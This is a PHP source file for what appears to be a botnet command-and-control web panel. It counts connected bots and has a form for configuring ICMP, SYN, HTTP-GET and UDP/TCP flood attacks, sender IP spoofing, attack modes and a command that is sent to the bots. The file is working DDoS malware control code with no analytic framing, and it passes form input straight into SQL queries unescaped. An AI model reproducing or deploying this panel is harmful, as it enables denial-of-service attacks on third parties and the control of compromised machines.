<?

  error_reporting(E_ALL ^ E_NOTICE);

  session_start();
  if (!isset($_SESSION['auth'])) header("location: auth.php");

  require_once "config.php";
  require_once "MySQL.php";

  if (isset($_POST['opt']))
  {
       if (!isset($_POST['opt']['spoof_ip']))
            $_POST['opt']['spoof_ip'] = 0;

       foreach (array_keys($_POST['opt']) as $k)
            db_query("REPLACE INTO `opt` (`name`, `value`) VALUES ('$k', '{$_POST['opt'][$k]}')");

       header("location: index.php");
  }

  $opt = array();

  $r = db_query("SELECT * FROM `opt`");
  while ($f = mysql_fetch_array($r))
       $opt[$f['name']] = $f['value'];

  $r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`time`<".($opt['ufreq']*60));
  $btotal = intval(mysql_result($r, 0, 0));

  $r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`time`<".(60*60));
  $bhour = intval(mysql_result($r, 0, 0));

  $r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat` WHERE ".time()."-`time`<".(60*60*24));
  $bday = intval(mysql_result($r, 0, 0));

  $r = db_query("SELECT COUNT(*) AS `cnt` FROM `stat`");
  $ball = intval(mysql_result($r, 0, 0));

  $builds = array();
  $sql = "SELECT COUNT(*) AS `cnt`, `build` FROM `stat` GROUP BY `build`";
  $r = db_query($sql);
  while ($f = mysql_fetch_array($r))
       $builds[] = array('build' => $f['build'], 'cnt' => $f['cnt']);

?>

<html>
<head>
<title>:: Botnet control</title>
<LINK href=style.css type=text/css rel=StyleSheet>
</head>
<body bgcolor=#151d32>
<script>

         function wnd( url )
         {
                window.open( url, "", "statusbar=no,menubar=no,toolbar=no,scrollbars=yes,resizable=no,width=400,height=200");
         }

</script>
<table width='70%' align='center' bgcolor='#1B2541'>
 <tr>
 <td align='center'>
  <table><tr><td>
    <table>
    <tr><td align='right'>total bot's:</td><td><b><?=$btotal?></b></td></tr>
    <tr><td align='right'>bot's per hour:</td><td><b><?=$bhour?></b></td></tr>
    <tr><td align='right'>bot's per day:</td><td><b><?=$bday?></b></td></tr>
    <tr><td align='right'>bot's for all time:</td><td><b><?=$ball?></b></td></tr>
    </table>
    <table cellspacing='1'>
    <tr height='20'><td class='HEADER'><b>Control bots</b></td></tr>
    <form action='index.php' method='POST'>
    <tr class='ITEM'>
     <td>
     <table callspacing='0'>
    <tr><td colspan='2'><b>Flooders options</b><td></tr>
    <tr><td colspan='2'>ICMP flooder<td></tr>
    <tr>
     <td align='right'>freq:</td>
     <td><input type='text' name='opt[icmp_freq]' value='<?=$opt['icmp_freq']?>' size=7></td>
    </tr>
    <tr>
     <td align='right'>packetsize:</td>
     <td><input type='text' name='opt[icmp_size]' value='<?=$opt['icmp_size']?>' size=7></td>
    </tr>
    <tr><td colspan='2'>SYN flooder<td></tr>
    <tr>
     <td align='right'>freq:</td>
     <td><input type='text' name='opt[syn_freq]' value='<?=$opt['syn_freq']?>' size=7></td>
    </tr>
    <tr><td colspan='2'>HTTP-GET flooder<td></tr>
    <tr>
     <td align='right'>freq:</td>
     <td><input type='text' name='opt[http_freq]' value='<?=$opt['http_freq']?>' size=7></td>
    </tr>
    <tr>
     <td align='right'>threads:</td>
     <td><input type='text' name='opt[http_threads]' value='<?=$opt['http_threads']?>' size=7></td>
    </tr>
    <tr><td colspan='2'>UDP and TCP/UDP data flooders<td></tr>
    <tr>
     <td align='right'>UDP/TCP freq:</td>
     <td><input type='text' name='opt[tcpudp_freq]' value='<?=$opt['tcpudp_freq']?>' size=7></td>
    </tr>
    <tr>
     <td align='right'>UDP size:</td>
     <td><input type='text' name='opt[udp_size]' value='<?=$opt['udp_size']?>' size=7></td>
    </tr>
    <tr>
     <td align='right'>TCP size:</td>
     <td><input type='text' name='opt[tcp_size]' value='<?=$opt['tcp_size']?>' size=7></td>
    </tr>
    <tr><td colspan='2'><b>Advanced SYN and ICMP options</b><td></tr>
    <tr>
     <td align='right'>spoof sender IP:</td>
     <td><input type='checkbox' name='opt[spoof_ip]' value='1' <?=$opt['spoof_ip']?'checked':''?>></td>
    </tr>
    <tr>
     <td align='right'>attack mode:</td>
     <td>
       <select name='opt[attack_mode]'>
         <option value='0' <?=($opt['attack_mode']==0)?'selected':''?>>default</option>
         <option value='1' <?=($opt['attack_mode']==1)?'selected':''?>>drop socket</option>
         <option value='2' <?=($opt['attack_mode']==2)?'selected':''?>>drop by timeout</option>
       </select>
     </td>
    </tr>
    <tr>
     <td align='right'>max sessions:</td>
     <td><input type='text' name='opt[max_sessions]' value='<?=$opt['max_sessions']?>' size=7> (for 'drop by timeout')</td>
    </tr>
    <tr><td colspan='2'><td></tr>
    <tr><td colspan='2'><b>Command</b><td></tr>
    <tr><td colspan='2'><input type='text' name='opt[cmd]' value='<?=$opt['cmd']?>' size=33> [ <a href="javascript:wnd('cmdhelp.html')" style='color:black'>help</a> ]<td></tr>
    <tr><td align="right">refresh rate:</td><td><input type='text' name='opt[ufreq]' value='<?=$opt['ufreq']?>' size=7> (in minutes)</td></tr>
    <tr><td></td><td><input type='submit' value='submit'></td></tr>
    </form>
    </td>
    </tr>
    </table>
    </table>
  </td></tr></table>
 </td></tr></table>
</body>
</html>